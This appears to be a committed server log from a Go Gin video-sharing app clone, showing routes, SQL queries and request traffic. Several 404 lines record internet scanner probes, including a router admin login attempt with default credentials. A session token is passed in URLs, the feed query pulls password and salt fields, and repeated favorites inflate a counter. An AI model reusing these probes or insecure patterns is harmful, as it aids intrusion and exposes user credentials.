@@ -1,0 +1,1392 @@
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
+[GIN-debug] HEAD   /static/*filepath         --> github.com/gin-gonic/gin.(*RouterGroup).createStaticHandler.func1 (3 handlers)
+[GIN-debug] GET    /douyin/feed/             --> douyin/controller.Feed (3 handlers)
+[GIN-debug] GET    /douyin/user/             --> douyin/controller.UserInfo (3 handlers)
+[GIN-debug] POST   /douyin/user/register/    --> douyin/controller.Register (3 handlers)
+[GIN-debug] POST   /douyin/user/login/       --> douyin/controller.Login (3 handlers)
+[GIN-debug] POST   /douyin/publish/action/   --> douyin/controller.Publish (3 handlers)
+[GIN-debug] GET    /douyin/publish/list/     --> douyin/controller.PublishList (3 handlers)
+[GIN-debug] POST   /douyin/favorite/action/  --> douyin/controller.FavoriteAction (3 handlers)
+[GIN-debug] GET    /douyin/favorite/list/    --> douyin/controller.FavoriteList (3 handlers)
+[GIN-debug] POST   /douyin/comment/action/   --> douyin/controller.CommentAction (3 handlers)
+[GIN-debug] GET    /douyin/comment/list/     --> douyin/controller.CommentList (3 handlers)
+[GIN-debug] POST   /douyin/relation/action/  --> douyin/controller.RelationAction (3 handlers)
+[GIN-debug] GET    /douyin/relation/follow/list/ --> douyin/controller.FollowList (3 handlers)
+[GIN-debug] GET    /douyin/relation/follower/list/ --> douyin/controller.FollowerList (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Environment variable PORT is undefined. Using port :8080 by default
+[GIN-debug] Listening and serving HTTP on :8080
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653237268700&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 00:34:28 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[35.801ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 00:34:28 | 200 |   36.313486ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653237268700&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653237269449&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[70.238ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.708ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[69.701ms] [rows:6] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[226.561ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[69.650ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21)
+[GIN] 2022/05/23 - 00:34:29 | 200 |  279.851013ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.415ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 00:34:29 | 200 |  291.338391ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 00:34:29 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[258.630ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 00:34:29 | 200 |   258.84009ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653237269449&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN] 2022/05/23 - 00:34:30 | 200 |  1.025468342s |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 00:34:31 | 206 |  975.700493ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 00:34:31 | 206 |  355.115851ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 00:34:52 | 206 | 20.946201092s |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 00:36:28 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[64.830ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:28 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.699ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:28 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[136.621ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:29 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[135.214ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:28.966')
+[GIN] 2022/05/23 - 00:36:29 | 200 |  401.932729ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:32 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[64.914ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:32 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.576ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:32 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[134.806ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:32 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[135.235ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:32.255')
+[GIN] 2022/05/23 - 00:36:32 | 200 |  399.921669ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[64.789ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.590ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[136.274ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[139.713ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:33.328')
+[GIN] 2022/05/23 - 00:36:33 | 200 |   405.81935ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[64.747ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.561ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[135.605ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[146.859ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:33.774')
+[GIN] 2022/05/23 - 00:36:33 | 200 |  412.231889ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:33 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.778ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.593ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[64.570ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[145.648ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[64.455ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[150.692ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:34.179')
+[GIN] 2022/05/23 - 00:36:34 | 200 |  436.241547ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:23
+[138.446ms] [rows:1] UPDATE `video_t` SET `favorite_count`=favorite_count + 1.000000 WHERE id = 21
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:30
+[134.765ms] [rows:1] INSERT INTO `favorite_video_t` (`user_id`,`video_id`,`favorite_time`) VALUES (8,21,'2022-05-23 00:36:34.362')
+[GIN] 2022/05/23 - 00:36:34 | 200 |  402.670416ms |  210.41.103.169 | POST     "/douyin/favorite/action/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21&action_type=1"
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.857ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.764ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:41
+[69.914ms] [rows:2] SELECT * FROM `comment_video_t` WHERE video_id = 21
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:50
+[69.926ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 14
+
+2022/05/23 00:36:34 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:50
+[69.687ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 14
+[GIN] 2022/05/23 - 00:36:34 | 200 |  349.866281ms |  210.41.103.169 | GET      "/douyin/comment/list/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21"
+[GIN] 2022/05/23 - 01:09:14 | 404 |         998ns |  136.169.221.27 | GET      "/"
+[GIN] 2022/05/23 - 01:40:50 | 404 |         558ns | 176.111.173.223 | CONNECT  ""
+[GIN] 2022/05/23 - 01:41:51 | 404 |         894ns |   125.84.236.80 | HEAD     "/"
+[GIN] 2022/05/23 - 02:02:49 | 404 |         452ns |  137.184.37.199 | GET      "/manager/html"
+[GIN] 2022/05/23 - 02:22:20 | 404 |         374ns |   45.61.186.182 | GET      "/script"
+[GIN] 2022/05/23 - 02:40:35 | 404 |         683ns |     46.103.4.10 | GET      "/"
+[GIN] 2022/05/23 - 03:16:01 | 404 |       1.366µs |   85.163.125.53 | GET      "/"
+[GIN] 2022/05/23 - 03:27:41 | 404 |         645ns |  115.62.134.156 | GET      "/boaform/admin/formLogin?username=ec8&psd=ec8"
+[GIN] 2022/05/23 - 04:29:59 | 404 |         455ns |  179.43.167.122 | HEAD     "/"
+[GIN] 2022/05/23 - 04:49:16 | 404 |         546ns |   46.174.191.28 | GET      "/"
+[GIN] 2022/05/23 - 06:14:21 | 404 |         589ns |  198.235.24.152 | GET      "/"
+[GIN] 2022/05/23 - 09:31:57 | 404 |       1.655µs |  179.43.144.210 | GET      "/"
+[GIN] 2022/05/23 - 09:31:57 | 404 |         978ns |  179.43.144.210 | POST     "/HNAP1/"
+[GIN] 2022/05/23 - 10:18:17 | 200 |     267.476µs |    117.174.85.8 | GET      "/static/cover/10_1653225616_cover.jpg"
+[GIN] 2022/05/23 - 10:18:17 | 200 |     299.159µs |    117.174.85.8 | GET      "/static/cover/10_1653225603_cover.jpg"
+[GIN] 2022/05/23 - 10:18:18 | 200 |  772.267352ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:19 | 206 |  1.383021656s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:19 | 206 |  142.054008ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:20 | 200 |  183.522646ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:21 | 206 |  995.518687ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:22 | 206 |  927.509688ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:22 | 206 |  144.264012ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:44 | 206 | 21.215446132s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:45 | 200 |  773.996913ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:18:47 | 206 |  1.400128875s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:24 | 200 |  499.858613ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:25 | 206 |  1.002529683s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:25 | 206 |  145.143351ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:26 | 200 |  204.112776ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:27 | 206 |  436.929302ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:28 | 206 |  897.390537ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:28 | 206 |  207.802917ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:44 | 206 | 16.244224364s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:45 | 200 |  844.172811ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:26:47 | 206 |  2.197629932s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:06 | 200 |  852.469421ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:07 | 206 |  1.362462101s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:07 | 206 |  145.932768ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:07 | 200 |  180.693634ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:09 | 206 |  508.433755ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:10 | 206 |  1.402873946s |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:27:10 | 206 |  156.573174ms |    117.174.85.8 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274476112&token=889871ff7dd0423b970e2e98b619bba9
+[mysql] 2022/05/23 10:54:35 packets.go:123: closing bad idle connection: unexpected read from socket
+[mysql] 2022/05/23 10:54:35 packets.go:123: closing bad idle connection: unexpected read from socket
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[220.417ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:36 | 200 |  220.611793ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274476112&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274476572&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[73.549ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[73.406ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[73.209ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[73.676ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:36 | 200 |  294.308771ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[207.201ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:36 | 200 |  207.367056ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274476572&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[333.641ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:36 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.259ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:36 | 200 |  403.202722ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:36 | 200 |  486.407684ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:54:37 | 206 |  982.135109ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:37 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.235ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+[GIN] 2022/05/23 - 10:54:37 | 206 |   172.74658ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:37 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.149ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:37 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:41
+[69.161ms] [rows:2] SELECT * FROM `comment_video_t` WHERE video_id = 21
+
+2022/05/23 10:54:38 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:50
+[69.135ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 14
+
+2022/05/23 10:54:38 /home/douyin/douyin/douyin-v1.0.7/dao/CommentDao.go:50
+[69.023ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 14
+[GIN] 2022/05/23 - 10:54:38 | 200 |  346.176973ms |  210.41.103.169 | GET      "/douyin/comment/list/?token=889871ff7dd0423b970e2e98b619bba9&video_id=21"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274480273&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 10:54:39 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[34.909ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:39 | 200 |   35.106164ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274480273&token=889871ff7dd0423b970e2e98b619bba9"
+[GIN] 2022/05/23 - 10:54:40 | 206 |  1.980468957s |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN-debug] redirecting request 301: /douyin/feed/ --> /douyin/feed/?latest_time=1653274480957&token=889871ff7dd0423b970e2e98b619bba9
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.156ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[73.268ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[69.084ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+[GIN] 2022/05/23 - 10:54:40 | 200 |  138.470227ms |  210.41.103.169 | GET      "/douyin/publish/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[73.094ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:47
+[73.381ms] [rows:12] SELECT * FROM `favorite_video_t` WHERE user_id = 8
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/VideoDao.go:16
+[189.384ms] [rows:3] SELECT `video_t`.`id`,`video_t`.`author_id`,`video_t`.`play_url`,`video_t`.`cover_url`,`video_t`.`favorite_count`,`video_t`.`comment_count`,`video_t`.`create_time`,`Author`.`user_id` AS `Author__user_id`,`Author`.`user_name` AS `Author__user_name`,`Author`.`password` AS `Author__password`,`Author`.`salt` AS `Author__salt`,`Author`.`follow_count` AS `Author__follow_count`,`Author`.`follower_count` AS `Author__follower_count`,`Author`.`create_time` AS `Author__create_time` FROM `video_t` LEFT JOIN `user_t` `Author` ON `video_t`.`author_id` = `Author`.`user_id` ORDER BY create_time DESC LIMIT 30
+[GIN] 2022/05/23 - 10:54:40 | 200 |  189.560765ms |  210.41.103.169 | GET      "/douyin/feed/?latest_time=1653274480957&token=889871ff7dd0423b970e2e98b619bba9"
+
+2022/05/23 10:54:40 /home/douyin/douyin/douyin-v1.0.7/dao/FavoriteDao.go:53
+[73.473ms] [rows:1] SELECT * FROM `video_t` WHERE id in (21,21,21,21,21,21,21,21,21,21,21,21)
+[GIN] 2022/05/23 - 10:54:40 | 200 |  293.687091ms |  210.41.103.169 | GET      "/douyin/favorite/list/?token=889871ff7dd0423b970e2e98b619bba9&user_id=10"
+[GIN] 2022/05/23 - 10:54:41 | 200 |  545.046545ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+[GIN] 2022/05/23 - 10:54:41 | 206 |  431.984333ms |  210.41.103.169 | GET      "/static/10_1653225616_VID_20220504_201714.mp4"
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[63.257ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/LoginTicketDaoGorm.go:65
+[69.032ms] [rows:1] SELECT * FROM `login_ticket` WHERE ticket = '889871ff7dd0423b970e2e98b619bba9'
+
+2022/05/23 10:54:41 /home/douyin/douyin/douyin-v1.0.7/dao/UserDaoGorm.go:47
+[63.105ms] [rows:1] SELECT * FROM `user_t` WHERE user_id = 8
